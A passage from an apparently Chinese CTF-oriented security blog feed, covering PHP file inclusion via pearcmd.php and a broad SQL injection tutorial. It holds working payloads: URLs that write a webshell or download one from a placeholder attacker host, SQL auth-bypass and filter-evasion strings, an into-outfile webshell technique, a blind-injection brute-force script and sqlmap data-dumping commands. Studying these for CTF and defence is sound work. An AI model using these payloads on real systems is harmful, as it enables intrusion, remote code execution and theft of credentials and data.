variables_order=EGPCS -d open_basedir=&quot;&quot; -d safe_mode=0 -d register_argc_argv=&quot;On&quot; -d auto_prepend_file=&quot;&quot; -d auto_append_file=&quot;&quot; $INCDIR/pearcmd.php &quot;$@&quot;</code></pre><p>可以发现最后一行调用了pearcmd.php文件。</p><ul><li>pearcmd.php文件在<code>user/share/php</code>下。,可以发现pear会在pearcmd.php获取命令行参数</li></ul><pre><code class="php">PEAR_Command::setFrontendType(&#39;CLI&#39;);$all_commands = PEAR_Command::getCommands();// remove this next part when we stop supporting that crap-ass PHP 4.2if (!isset($_SERVER[&#39;argv&#39;]) &amp;&amp; !isset($argv) &amp;&amp; !isset($HTTP_SERVER_VARS[&#39;argv&#39;])) &#123;    echo &#39;ERROR: either use the CLI php executable, &#39; .         &#39;or set register_argc_argv=On in php.ini&#39;;    exit(1);&#125;$argv = Console_Getopt::readPHPArgv();// fix CGI sapi oddity - the -- in pear.bat/pear is not removedif (php_sapi_name() != &#39;cli&#39; &amp;&amp; isset($argv[1]) &amp;&amp; $argv[1] == &#39;--&#39;) &#123;    unset($argv[1]);    $argv = array_values($argv);&#125;</code></pre><ul><li>而pear获取命令行参数的函数<code>Console/Getopt.php --&gt; readPHPArgv</code>当中</li></ul><pre><code class="php">public static function readPHPArgv()    &#123;        global $argv;        if (!is_array($argv)) &#123;            if (!@is_array($_SERVER[&#39;argv&#39;])) &#123;                if (!@is_array($GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;])) &#123;                    $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;;                    return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg);                &#125;                return $GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;];            &#125;            return $_SERVER[&#39;argv&#39;];        &#125;        return $argv;    &#125;</code></pre><p>可以发现的是在有$argv的情况下，pearcmd.php是通过$_SERVER[‘argv’]来获取到参数。这样就通过包含<code>pearcmd.php</code>，利用<code>$_SERVER[&#39;argv&#39;]</code>来调用pear命令。</p><h3 id="3、总结原理"><a href="#3、总结原理" class="headerlink" title="3、总结原理"></a>3、总结原理</h3><blockquote><p>当register_argc_argv参数开启时，此时的url传递的参数都会传入至$_SERVER[‘argv’]这个变量当中。而在整个环境中如果存在pear命令，而pear命令就可以利用$_SERVER[‘argv’]来获取对应的参数。而pear命令的参数当中就不乏有很多是可以操控写入的文件以及文件的内容的。</p><p>那么此时当我们包含pearcmd.php文件时，</p></blockquote><h2 id="四、利用方式"><a href="#四、利用方式" class="headerlink" title="四、利用方式"></a>四、利用方式</h2><h3 id="1、config-create"><a href="#1、config-create" class="headerlink" title="1、config-create"></a>1、config-create</h3><p>这个是P神提供的一种思路</p><pre><code class="shell">config-create: must have 2 parameters, root path and filename to save as</code></pre><p>输入两个参数，第一个为绝对路径，还有保存配置文件的文件名</p><p>测试一下config-create参数</p><pre><code class="bash">pear config-create /pearConfingcreateTest ./test.txt</code></pre><p>查看hello.txt文件可以得到</p><pre><code class="php">#PEAR_Config 0.9a:12:&#123;s:7:&quot;php_dir&quot;;s:31:&quot;/pearConfingcreateTest/pear/php&quot;;s:8:&quot;data_dir&quot;;s:32:&quot;/pearConfingcreateTest/pear/data&quot;;s:7:&quot;www_dir&quot;;s:31:&quot;/pearConfingcreateTest/pear/www&quot;;s:7:&quot;cfg_dir&quot;;s:31:&quot;/pearConfingcreateTest/pear/cfg&quot;;s:7:&quot;ext_dir&quot;;s:31:&quot;/pearConfingcreateTest/pear/ext&quot;;s:7:&quot;doc_dir&quot;;s:32:&quot;/pearConfingcreateTest/pear/docs&quot;;s:8:&quot;test_dir&quot;;s:33:&quot;/pearConfingcreateTest/pear/tests&quot;;s:9:&quot;cache_dir&quot;;s:33:&quot;/pearConfingcreateTest/pear/cache&quot;;s:12:&quot;download_dir&quot;;s:36:&quot;/pearConfingcreateTest/pear/download&quot;;s:8:&quot;temp_dir&quot;;s:32:&quot;/pearConfingcreateTest/pear/temp&quot;;s:7:&quot;bin_dir&quot;;s:27:&quot;/pearConfingcreateTest/pear&quot;;s:7:&quot;man_dir&quot;;s:31:&quot;/pearConfingcreateTest/pear/man&quot;;&#125;</code></pre><p>可以发现写入的内容存放到了hello.txt文件当中去了。那么此时的文件名、路径、文件内容都是可控的。此时就可以getshell了</p><p>针对web前端的传参可以修改命令为：</p><pre><code class="http">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=一句话;?&gt;+/tmp/test.php</code></pre><ul><li>config-create：参数</li><li>&#x2F;&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;&#x2F;一句话 ：整个被作为参数传入了命令行，但是get参数file被正常解析，这是因为前面说过的即使URL中存在等于号和问号一样会被传入</li><li>&#x2F;tmp&#x2F;test.php：写入的文件名</li></ul><h3 id="2、install"><a href="#2、install" class="headerlink" title="2、install"></a>2、install</h3><p>install参数就是下载远程文件至本地， - R可以指定下载文件保存的目录 </p><pre><code class="shell">pear install -R /tmp http://xxxxxx/shell.php</code></pre><p>payload：</p><pre><code class="http">?+install+--installroot+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+http://[vps]:[port]/test1.php</code></pre><ul><li>install：install下载文件</li><li>–installroot：指定文件的路径</li><li>&amp;file&#x3D;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php&amp;：包含的file的参数</li><li>http:&#x2F;&#x2F;[vps]:[port]&#x2F;test1.php：要下载的远程文件</li></ul><p>变形payload：</p><pre><code class="http">file=/usr/local/lib/php/pearcmd.php&amp;+install+-R+/tmp+http://192.168.1.9/index.php</code></pre><h3 id="3、本地的情况"><a href="#3、本地的情况" class="headerlink" title="3、本地的情况"></a>3、本地的情况</h3><pre><code class="shell">pear -c /tmp/.shell.php -d man_dir=&lt;?=一句话?&gt; -s</code></pre><p>相当于写配置文件到<code>/temp/.shell.php</code>。其中的内容和文件名都可控。</p><h3 id="4、download"><a href="#4、download" class="headerlink" title="4、download"></a>4、download</h3><p>payload</p><pre><code class="http">?+download+http://[vps]:[port]/test1.php&amp;file=/usr/local/lib/php/pearcmd.php</code></pre><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><blockquote><p>存在很多细节没有完善，之后等遇到具体的题目之后再具体的分析。</p></blockquote><h2 id="六、参考链接"><a href="#六、参考链接" class="headerlink" title="六、参考链接"></a>六、参考链接</h2><ol><li>P神：<a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></li><li>W4师傅：<a href="https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/#more">https://w4rsp1t3.moe/2021/11/26/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8pearcmd%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/#more</a></li><li>入山梵行：<a href="https://tttang.com/archive/1312/#toc_0x06-pearcmdphp">https://tttang.com/archive/1312/#toc_0x06-pearcmdphp</a></li><li>bfengj：<a href="https://blog.csdn.net/rfrder/article/details/121042290">https://blog.csdn.net/rfrder/article/details/121042290</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 文件包含 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入总结</title>
      <link href="/2022/07/20/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2022/07/20/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入总结"><a href="#SQL注入总结" class="headerlink" title="SQL注入总结"></a>SQL注入总结</h1><h2 id="一、sql注入的基本原理"><a href="#一、sql注入的基本原理" class="headerlink" title="一、sql注入的基本原理"></a>一、sql注入的基本原理</h2><p>PHP从MySQL数据库中读取数据的方式</p><pre><code class="php">$id = $_GET[&quot;id&quot;];$sql = &quot;select * from user where id = $id&quot;;$result = mysqli_query($sql);$row = mysql_fetch_array($result);</code></pre><ul><li>首先是通过get请求从前端的表单中收集到你输入的值</li><li>然后调用mysqli_query函数向当前活动数据库发送一条MySQL查询语句，将结果集取出并赋给变量$result</li><li>最后，mysql_fetch_arry从结果集中取得一行作为关联数组</li></ul><p>从上面的sql语句的查询方式可以发现一个问题，那就是如果我们输入的id被我恶意构造就可能会造成其余数据的泄露，例如如果输入id为：</p><pre><code class="sql">id = 1 or 1 = 1</code></pre><p>那么此时的sql查询语句就会变成</p><pre><code class="sql">select * from user where id = 1 or 1 = 1</code></pre><p>这里存在or，且后面的值为1，那么无论前面的id的值为多少他都会把user表里面的所有的东西打印出来，如果user表中存在管理员的账号密码那么我们就可以直接获得管理员的权限。</p><p>造成的原因：</p><blockquote><p>整个过程实现的原因主要就是网站对于我们输入的sql语句的内容没有进行过滤导致的，这样网站的服务器就会执行我们输入的所有内容，只要语句本身没有语法问题就会执行，导致执行本不该执行的内容</p></blockquote><h2 id="二、SQL注入常见的分类"><a href="#二、SQL注入常见的分类" class="headerlink" title="二、SQL注入常见的分类"></a>二、SQL注入常见的分类</h2><h3 id="1、数字型注入与字符型注入"><a href="#1、数字型注入与字符型注入" class="headerlink" title="1、数字型注入与字符型注入"></a>1、数字型注入与字符型注入</h3><p>产生这种分类主要的原因是sql查询语句的不同，可分为数字型注入与字符型注入。</p><ul><li>数字型注入：注入点的数据内容是数字型，就是说对于输入的内容没有用单引号引起来</li></ul><pre><code class="sql">select * from user where id = $_GET[&#39;id&#39;]id=1;select * from user where id = 1;</code></pre><ul><li>字符型注入：注入点的数据内容是字符型，对于输入的内容用单引号引起来</li></ul><pre><code class="sql">select * from user where id = &#39;$_GET[&#39;id&#39;]&#39;;id=1;select * from user where id = &#39;1&#39;;</code></pre><p>判断是数字型注入还是字符型注入的方式（只要测试最后的时候只有一个左引号会不会报错即可）</p><ul><li>① 1‘ &amp; ’1‘&#x3D;’1        ② 1 &amp; 1&#x3D;1<ul><li>①报错 而 ② 不报错可能是数字型注入</li><li>①不报错 而 ②报错可能是字符型注入</li><li>其余的方式可能是有所过滤</li></ul></li></ul><h3 id="2、报错注入与盲注"><a href="#2、报错注入与盲注" class="headerlink" title="2、报错注入与盲注"></a>2、报错注入与盲注</h3><p>产生这种分类的原因是返回的结果不同，可分为报错注入与盲注</p><ul><li><p>报错注入：程序会将获取到的信息或者是报错信息直接显示在页面上就是报错注入</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220718125224941.png" alt="image-20220718125224941"></p></li><li><p>盲注：在注入的过程中程序不显示任何SQL报错信息</p></li></ul><h2 id="三、SQL基本知识点"><a href="#三、SQL基本知识点" class="headerlink" title="三、SQL基本知识点"></a>三、SQL基本知识点</h2><h3 id="1、注释符"><a href="#1、注释符" class="headerlink" title="1、注释符"></a>1、注释符</h3><p>（1）单行注释</p><ul><li>– （空格）</li><li><h1 id=""><a href="#" class="headerlink" title=""></a></h1></li></ul><p>（2）多行注释</p><ul><li>&#x2F;**&#x2F;</li></ul><p>注意点：</p><p>① 两横杠注释的后面加上一个空格后，后面的才是注释，所以在sql注入的时候需要加上一个加号（+），因为记号经过url解码以后就会为一个空格</p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220713095514511.png" alt="image-20220713095514511" style="zoom:200%;" /><p>② 在url时不能直接写入 #号：因为url中的 # 本来的用途是跳转到页面锚点，一个URL中的#后面的值不影响访问网页内容，可以理解成说#后面的内容不会发送到服务端，所以sql查询是无法实现，需要使用 #编码的 %23来实现，因为这样进行传送时，它会将其（%23）进行解码成 #，以实现注释功能</p><p>③ 注释的作用就是注释后面的内容， 在sql注入过程中有时候当你进行sql语句查询时最后面的引号无法与前面的单引号形成闭合，导致最后面多存在一条单引号， 所以需要使用注释符将后面的单引号进行注释掉</p><pre><code class="sql">select username, password from user where id=&#39;$content&#39;$content = 1&#39; union select 1,2 --+以此实现语句的正确==&gt; select username, password from user where id=&#39;1&#39; union select 1,2 -- &#39; </code></pre><h3 id="2、union联合查询"><a href="#2、union联合查询" class="headerlink" title="2、union联合查询"></a>2、union联合查询</h3><blockquote><p>联合查询就是把多次查询的结果合并起来，形成新的查询结果集，但是它有一些语法限制</p></blockquote><ul><li>每一个查询的列数和字段类型都要相同</li><li>union是将全部的数据合并在一起，而union all是将合并后的数据去重</li></ul><p>例如下面的会把user表中所有的数据都给展示出来</p><pre><code class="sql">select * from user where username != flag  union select * from user where username=flag;</code></pre><h3 id="3、连接查询"><a href="#3、连接查询" class="headerlink" title="3、连接查询"></a>3、连接查询</h3><p>连接查询有全连接、右外连接与左外连接，sql注入中常见的一般是右外连接</p><p>右外连接：右表中的记录都会记录在结果集当中，并于左边相对应，如果左表没有则显示null</p><pre><code class="sql">select * from user a right join admin b a.id=b.id;</code></pre><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220718152108272.png" alt="image-20220718152108272" style="zoom:150%;" /><h3 id="4、group-by-与-having"><a href="#4、group-by-与-having" class="headerlink" title="4、group by 与 having"></a>4、group by 与 having</h3><p>（1）group by表示分组操作， having表示查询结果返回结果集以后对查询结果进行过滤操作， 它的作用相当于where，但与where存在一定区别</p><pre><code class="sql">mysql&gt; select username,passwd from user group by username, passwd;+----------+-----------------------------+| username | passwd                      |+----------+-----------------------------+| 0admin   | 13123                       || flag     | flag&#123;this_is_flag_ha_ha_ha&#125; || lisi     | 12345                       || wangwu   | 123456                      || zhangsan | 1234                        |+----------+-----------------------------+5 rows in set (0.05 sec)mysql&gt; select username,passwd from user group by username, passwd having username!=&#39;flag&#39;;+----------+--------+| username | passwd |+----------+--------+| 0admin   | 13123  || lisi     | 12345  || wangwu   | 123456 || zhangsan | 1234   |+----------+--------+4 rows in set (0.04 sec)</code></pre><p>说明：查询列表必须特殊，要求是分组函数和group by后出现的字段</p><p>（2）having与where的区别</p><p><a href="https://blog.csdn.net/yajie_china/article/details/80089553">https://blog.csdn.net/yajie_china/article/details/80089553</a></p><h3 id="5、运算符的优先级"><a href="#5、运算符的优先级" class="headerlink" title="5、运算符的优先级"></a>5、运算符的优先级</h3><p>根据运算符的优先级会进行执行顺序的调整，特别配合or运算符会实现意想不到的结果，例如存在如下的sql语句</p><pre><code class="sql">select * from user where username != &#39;flag&#39; or id = &#39;$id&#39; limit 0, 1;</code></pre><p>当我们输入的id为：</p><pre><code class="sql">$id = 999&#39; or id=&#39;26&#39; and &#39;1&#39;=&#39;1</code></pre><p>此时的sql语句为：</p><pre><code class="sql">select * from user where (username != &#39;flag&#39; or id = &#39;999&#39;) or (id=&#39;26&#39; and &#39;1&#39;=&#39;1&#39;) limit 0,1;</code></pre><p>根据运算符的优先级， 这样就会输入id&#x3D;26的那一行的内容了</p><p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220718130615867.png" alt="image-20220718130615867"></p><h3 id="6、常见的函数"><a href="#6、常见的函数" class="headerlink" title="6、常见的函数"></a>6、常见的函数</h3><p>（1）substr：主要是用于截取对应字段指定长度</p><pre><code>substr函数(string, pos, len)</code></pre><ul><li>string：指定字符串</li><li>pos：规定字符串从何处开始（这里是从1开始的而不是0），为正数从开头开始，为负数从结尾开始</li><li>len：要截取字符串的长度（从1开始计数）</li></ul><p>（2） regexp运算符</p><p>它是正则表达式（regular expression）的缩写，使用的方式如下，但是除了sql语句正常的%与_以外，正则表达式的那些语法均能使用</p><pre><code class="sql">select * from user where username like &quot;%la%&quot;;select * from user where username regexp &quot;%la%&quot;;# ^：查找的字符串以什么开头：输入的名字必须以flag开头select *from user where username regexp &quot;^flag&quot;# $:查找的字符串以什么结尾：查找的姓名必须以 &#125; 结尾select *from user where username regexp &quot;&#125;$&quot;# |:表示多个搜索方式：查询姓名以flag开头或者是以&#125;结尾的select *from user where username regexp &quot;^flag|&#125;$&quot;</code></pre><p>（3）if语句</p><pre><code class="sql">IF( expr1 , expr2 , expr3 )</code></pre><ul><li>expr1 的值为 TRUE，则返回值为 expr2 </li><li>expr1 的值为FALSE，则返回值为 expr3</li></ul><p>（4） load_file（）与  into outfile（）</p><p>链接：<a href="https://blog.csdn.net/weixin_44940180/article/details/107859666?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-107859666-blog-99558836.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2-107859666-blog-99558836.pc_relevant_default&amp;utm_relevant_index=4">https://blog.csdn.net/weixin_44940180/article/details/107859666?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2-107859666-blog-99558836.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2-107859666-blog-99558836.pc_relevant_default&amp;utm_relevant_index=4</a></p><p>① load_file（）：读取一个文件并将其内容作为一个字符串返回</p><p>② into outfile()：将查询到的数据下载到本地， 或者是保存成一个webshell上传至服务器</p><ul><li>具有root权限</li><li>在数据库配置文件中，配置项含有：secure_five_priv&#x3D;’’。（而在数据库中默认此项为null）</li><li>知道数据库的绝对路径</li></ul><p>说明：如果有权限的话可以直接写一句话木马上去，实现远程代码执行</p><p>两者的区别：</p><ul><li>load_file：联合查询中会占一位，用括号单引号包围路径</li><li>into outfile：联合查询不占位，用单引号包围路径</li></ul><h3 id="7、information-schema数据库"><a href="#7、information-schema数据库" class="headerlink" title="7、information_schema数据库"></a>7、information_schema数据库</h3><p>参考链接： <a href="https://blog.csdn.net/weixin_38972910/article/details/86012110">https://blog.csdn.net/weixin_38972910/article/details/86012110</a></p><p>（1）概念</p><p>information schema：信息的组织与结构  &#x3D;&#x3D;》 提供了访问数据库元数据的方式</p><p>元数据：关于数据的数据，如数据库名、表名、列的数据类型或访问权限的等等</p><p>information_schema：存储了schemata表（schema的复数形式）、tables表和columns表</p><p>（2）数据库中各个表中存储的信息</p><p>① schemata表：提供了当前MySQL当中所有的数据库的信息，show databases命令的结果就取自此表，存储所有的数据库名</p><pre><code class="sql">mysql&gt; select * from information_schema.schemata;+--------------+--------------------+----------------------------+------------------------+----------+| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |+--------------+--------------------+----------------------------+------------------------+----------+| def          | information_schema | utf8                       | utf8_general_ci        | NULL     || def          | challenges         | gbk                        | gbk_chinese_ci         | NULL     || def          | ctfshow            | utf8                       | utf8_general_ci        | NULL     || def          | mysql              | latin1                     | latin1_swedish_ci      | NULL     || def          | performance_schema | utf8                       | utf8_general_ci        | NULL     || def          | security           | utf8                       | utf8_unicode_ci        | NULL     || def          | sys                | utf8                       | utf8_general_ci        | NULL     |+--------------+--------------------+----------------------------+------------------------+----------+</code></pre><p>② tables表：存储了数据库中的表的信息，包括某个表属于哪一个schema、表类型、表引擎、创建时间等信息。show tables from “schemaname（数据库名）的结果就出自这里。重点关注的列是table_name以及 table_schema</p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220713114503984.png" alt="image-20220713114503984" style="zoom:150%;" /><p>查询语句：</p><pre><code class="sql">select table_name from information_schema.tables where table_schema=datdabase();</code></pre><p>③ columns表：提供了表中的所有列信息，包括某个表的所有列以及每一列的信息，show columns from “表名”; 命令的结果就出自此表</p><img src="https://myblog-1305715400.cos.ap-nanjing.myqcloud.com/img/image-20220713124746979.png" alt="image-20220713124746979" style="zoom:150%;" /><p>查询语句</p><pre><code class="sql">select column_name from information_schema.columns where table_name=&#39;表名&#39; ;</code></pre><h2 id="四、常见的过滤以及绕过方式"><a href="#四、常见的过滤以及绕过方式" class="headerlink" title="四、常见的过滤以及绕过方式"></a>四、常见的过滤以及绕过方式</h2><h3 id="1、万能钥匙"><a href="#1、万能钥匙" class="headerlink" title="1、万能钥匙"></a>1、万能钥匙</h3><pre><code class="sql">999&#39; or &#39;1&#39; = &#39;1 999&#39; or username=&#39;flag999&#39; or &#39;1&#39; = &#39;1&#39; --+(%23)</code></pre><h3 id="2、对于返回集的判断"><a href="#2、对于返回集的判断" class="headerlink" title="2、对于返回集的判断"></a>2、对于返回集的判断</h3><p>（1）结果集过滤掉了数字</p><blockquote><p>利用replace函数将数字转换成其余字符以后再查询出来即可</p></blockquote><p>注意点：</p><ul><li>使用特殊字符时注意不能使用本身带有特殊含义的符号，例如%、#、&amp;符号</li></ul><p>（2）过滤掉了ascii码表上的所有字符</p><blockquote><p>那么其实就需要将读取到的内容存储到一个文件当中，然后再查看该文件了</p></blockquote><pre><code class="sql"># 将从user表中查询到的账号密码写进文件&#39;/var/www/html/flag.txt&#39;当中、select username, password from ctfshow_user5 into outfile &#39;/var/www/html/flag.txt&#39;</code></pre><p>说明：</p><blockquote><p>如果我们写进文件的内容是我们自己构造好的一句话木马， 那么此时就有可能实现远程代码执行，要写进一句话木马有三个条件，不然有可能可写不可执行，可执行不可写</p></blockquote><ul><li>具有root权限</li><li>在数据库配置文件中，配置项含有：secure_five_priv&#x3D;’’。（而在数据库中默认此项为null）</li><li>知道数据库的绝对路径</li></ul><h3 id="3、过滤掉了空格"><a href="#3、过滤掉了空格" class="headerlink" title="3、过滤掉了空格"></a>3、过滤掉了空格</h3><ul><li>常见的可以替换成空格的ascii码表有</li></ul><table><thead><tr><th align="center">十六进制</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">09</td><td align="center">水平制表符</td></tr><tr><td align="center">0a</td><td align="center">换行符</td></tr><tr><td align="center">0b</td><td align="center">垂直制表符</td></tr><tr><td align="center">0c</td><td align="center">换页符</td></tr><tr><td align="center">0D</td><td align="center">回车键</td></tr><tr><td align="center">20</td><td align="center">空格</td></tr></tbody></table><ul><li><p>或者是使用反引号进行替换，不过反引号的实际作用是对于表名列名与保留字相同时进行区分的。</p></li><li><p>&#x2F;**&#x2F;可以作为空格</p></li></ul><h3 id="4、过滤掉了注释"><a href="#4、过滤掉了注释" class="headerlink" title="4、过滤掉了注释"></a>4、过滤掉了注释</h3><p>如果程序使用了limit限制，那么你输出的结果就会收到限制，那么查询时就需要具体精确到某一行</p><h3 id="5、过滤掉了引号"><a href="#5、过滤掉了引号" class="headerlink" title="5、过滤掉了引号"></a>5、过滤掉了引号</h3><p>对于条件的查询，数字可以使用十六进制的形式实现，带有字符串的可以使用concat以及true、false的方式实现</p><h3 id="6、过滤掉了select、where等"><a href="#6、过滤掉了select、where等" class="headerlink" title="6、过滤掉了select、where等"></a>6、过滤掉了select、where等</h3><p>过滤掉这些以后，显然就不能通过联合查询来绕过了，因为union使用的就是select，那么可以使用的另外一种方式就是group by 与 having</p><pre><code class="sql">select * from user group by username having username like &#39;fla%&#39;;</code></pre><h3 id="7、过滤掉了数字"><a href="#7、过滤掉了数字" class="headerlink" title="7、过滤掉了数字"></a>7、过滤掉了数字</h3><p>可以使用 true、false以及concat函数进行实现，甚至是字符也可以实现,需要根据ascii对应的值实现数量的</p><pre><code class="sql"># 数字11select concat(true,true);# 数字21select concat(true+true,true);# 数字111select concat(true,true,true);# 字符 fselect concat(char(true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true+true)) as value</code></pre><h3 id="8、盲注"><a href="#8、盲注" class="headerlink" title="8、盲注"></a>8、盲注</h3><p>盲注一般都会存在如下的python脚本</p><pre><code class="python">from urllib import responseimport requestsimport timeurl = &quot;http://81b26ac9-4239-4971-bd67-b9015ddedb25.challenge.ctf.show/select-waf.php&quot;flagdir = &quot;&#125;abcdefghijklmnopqrstuvwxyz-0123456789&#123;&quot;    # 字典payload = &quot;(ctfshow_user)where(pass)like\&quot;&#123;&#125;%\&quot;&quot; # payloadflag=&quot;ctfshow&#123;&quot;         # 爆破获得的flagfor i in range(0, 40):    for x in flagdir:        data = &#123;            &quot;tableName&quot;:payload.format(flag+x)      # 爆破内容        &#125;        response = requests.post(url, data=data)    #发送        time.sleep(0.3)        if response.text.find(&quot;user_count = 1&quot;)&gt;0:  #如果接收到user_count = 1，就说明爆破正确，flag字符串拼接，然后爆下一个字符            flag+=x            break        else:            continue    print(flag)</code></pre><p>request库：继承了urllib2的所有特性。Requests支持HTTP连接保持和连接池，支持使用cookie保持会话，支持文件上传，支持自动确定响应内容的编码，支持国际化的 URL 和 POST 数据自动编码</p><p>链接：<a href="https://blog.csdn.net/qq_37616069/article/details/80376776">https://blog.csdn.net/qq_37616069/article/details/80376776</a></p><p>post请求方式：</p><pre><code class="python">response = requests.post(url, data=data)# data：字典格式，一一对应的输入# response.text.find：返回的值中查找</code></pre><p>handler()</p><h3 id="9、md5、弱类型比较"><a href="#9、md5、弱类型比较" class="headerlink" title="9、md5、弱类型比较"></a>9、md5、弱类型比较</h3><p>（1）md5的概念</p><pre><code class="php">md5(string $string, bool $binary = false): string</code></pre><p>参数说明：</p><ul><li>$string：表示要加密的字符串</li><li>$binary：它默认为false，如果binary为true时，那么md5摘要将以十六字符长度的原始二进制返回（不清楚，反正是有很多乱码），不然就会以32字符的十六进制数形式返回</li></ul><p>注意点：当bianary为true是，存在一个特殊的值ffifdyop，使得md5加密以后返回的是 ，再根据运算符的优先级就有机会构造payload</p><blockquote><p>‘or’6�]��!r,��b</p></blockquote><p>（2）弱类型比较</p><blockquote><p>最容易与interval函数进行结合，然后与数字进行比较，但是这里会存在一个强制转换问题，就是当你的字符串与数字进行比较的时候，字符串就会被强制转换成数字，而如果这个字符串时不是以数字或者时正负号开头的，那么其转换后的值就为0，这样就会导致当你查询到的结果为字母开头的话，只要你输入的内容是0就会绕过检查</p></blockquote><h2 id="五、sqlmap的使用"><a href="#五、sqlmap的使用" class="headerlink" title="五、sqlmap的使用"></a>五、sqlmap的使用</h2><h3 id="1、有关链接："><a href="#1、有关链接：" class="headerlink" title="1、有关链接："></a>1、有关链接：</h3><ul><li><a href="https://github.com/sqlmapproject/sqlmap">https://github.com/sqlmapproject/sqlmap</a></li><li><a href="https://github.com/sqlmapproject/sqlmap/wiki/Usage">https://github.com/sqlmapproject/sqlmap/wiki/Usage</a></li><li><a href="https://blog.csdn.net/weixin_46634468/article/details/120887609">https://blog.csdn.net/weixin_46634468/article/details/120887609</a></li></ul><h3 id="2、查询内容"><a href="#2、查询内容" class="headerlink" title="2、查询内容"></a>2、查询内容</h3><p>（1）查询数据库名</p><pre><code class="shell"># 查询所有的数据库python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -dbs --batch# 查询当前网站使用的数据库 python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; --current-db --batch</code></pre><p>参数说明</p><ul><li>-u ：表示url链接</li><li>-dbs：所有的数据库</li><li>–batch：忽略下面所有需要询问你时yes还是no的内容，执行默认的</li><li>–current-db：当前的数据库</li></ul><p>（2）查询表名</p><pre><code class="shell">python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security  --tables --batch</code></pre><p>参数说明：</p><ul><li>-D：database，数据库</li><li>-tables：所有的表</li></ul><p>（3）查询列名</p><pre><code class="shell">python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security  -T users --columns --batch</code></pre><p>（4）查询需要的数字</p><pre><code class="shell"> python sqlmap.py -u &quot;http://localhost/sqli-labs-master/Less-1/?id=1&quot; -D security  -T users username, password --dump  --batch</code></pre><p>参数说明：</p><ul><li>username,password：需要查询的列</li><li>–dump：表示在页面展示出来，不下载到文件当中</li></ul><p>（5）Post请求方式</p><pre><code class="shell">python sqlmap.py -u &quot;http://172.17.10.11/pikachu/vul/sqli/sqli_id.php&quot; -data=&quot;id=1&amp;submit=%E6%9F%A5%E8%AF%A2&quot; -dbs --batch</code></pre><h3 id="3、用户的权限问题"><a href="#3、用户的权限问题" class="headerlink" title="3、用户的权限问题"></a>3、用户的权限问题</h3><p>（1）列出数据库管理系统用户</p><pre><code class="shell">python sqlmap.py -u &quot;url&quot; -users</code></pre><p>（2）查看数据库用户所有密码</p><pre><code class="shell">python sqlmap.py -u &quot;url&quot; -password</code></pre><h2 id="待解决"><a href="#待解决" class="headerlink" title="待解决"></a>待解决</h2><ul><li>sqlmap的实战的具体使用</li><li>实战题目的分析</li><li>ctfshow上面还有几道题</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>易校园自动打卡</title>
      <link href="/2022/07/20/%E6%98%93%E6%A0%A1%E5%9B%AD%E8%87%AA%E5%8A%A8%E6%89%93%E5%8D%A1/"/>
      <url>/2022/07/20/%E6%98%93%E6%A0%A1%E5%9B%AD%E8%87%AA%E5%8A%A8%E6%89%93%E5%8D%A1/</url>
      
